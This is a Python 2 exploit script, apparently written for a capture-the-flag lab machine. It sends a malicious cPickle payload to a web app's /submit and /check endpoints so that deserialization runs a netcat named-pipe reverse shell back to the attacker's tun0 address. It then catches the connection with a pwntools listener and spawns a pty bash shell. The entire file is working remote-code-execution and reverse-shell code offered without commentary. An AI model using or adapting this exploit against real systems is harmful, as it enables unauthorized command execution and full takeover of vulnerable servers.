import cPickle
import os
import urllib
import httplib
import subprocess
import netifaces as ni
from hashlib import md5
from pwn import *


# Get the IP of tun0
ni.ifaddresses('tun0')
IP_TUNNEL = ni.ifaddresses('tun0')[ni.AF_INET][0]['addr']
log.info('Sending Reverse Shell back to: ' + IP_TUNNEL)

CMD = 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ' + IP_TUNNEL + ' 13337 >/tmp/f'

# This class is going to be serialized
class Exploit(object):
    def __reduce__(self):
    	return (os.system, (CMD,))
        # return (os.system, ('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.239 13337 >/tmp/f',))


def createPayload():
    return cPickle.dumps(Exploit(),0)

    
# Construct the Payload
form_char = "S'#homer'\n"
form_quote = createPayload()


# Sending Submit Payload
data_submit = urllib.urlencode({'character': form_char, 'quote': form_quote})
h1 = httplib.HTTPConnection('10.10.10.70:80')
headers = {"Content-type": "application/x-www-form-urlencoded", "Accept": "text/plain"}
h1.request('POST', '/submit', data_submit, headers)
r1 = h1.getresponse()
# print r1.read()


# get the payload checksum of the newly created FILE
checksum = md5(form_char + form_quote).hexdigest()

# Sending Check Payload
data_check = urllib.urlencode({'id': checksum})
h2 = httplib.HTTPConnection('10.10.10.70:80')
headers = {"Content-type": "application/x-www-form-urlencoded", "Accept": "text/plain"}
h2.request('POST', '/check', data_check, headers)
# r2 = h2.getresponse()
# print r2.read()

# Setup a pwntools listener
l = listen(port=13337, bindaddr = "0.0.0.0")
c = l.wait_for_connection()
c.send("""python -c 'import pty; pty.spawn("/bin/bash")'\n""")
log.info('shell upgraded from sh to tty-bash')
c.interactive()

# Close the newly created listener



